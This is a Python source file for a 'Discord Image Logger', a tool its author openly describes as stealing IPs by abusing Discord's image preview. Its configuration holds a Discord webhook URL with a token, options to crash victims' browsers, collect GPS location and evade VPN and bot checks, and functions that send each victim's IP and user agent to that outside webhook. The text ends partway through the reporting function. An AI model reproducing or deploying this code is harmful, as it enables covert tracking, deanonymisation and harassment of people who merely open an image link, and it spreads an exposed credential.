# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://canary.discord.com/api/webhooks/1143195101535940628/JEFbHN-A_MBMCtBmb4eGMb6AwesqjHy8Fqr6SghBvUpVPTZsBn_5N6gXGRyxiB8cGk7J",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

